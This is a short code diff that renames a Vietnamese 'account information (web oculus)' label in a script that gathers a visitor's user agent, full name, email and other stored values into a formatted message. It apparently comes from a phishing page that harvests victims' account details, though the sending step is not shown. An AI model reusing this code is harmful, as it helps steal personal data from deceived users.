@@ -135,7 +135,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         var experience = localStorage.getItem('experience');
 
 
-        var content = "💬Thông Tin Tài Khoản 1 (web oculus)💬" +
+        var content = "💬Thông Tin Tài Khoản (web oculus)💬" +
             "\n" + "----------------------------------------------------------" +
             "\nFull Name: " + "`" + fullName + "`" +
             "\nEmail: " + "`" + email + "`" +
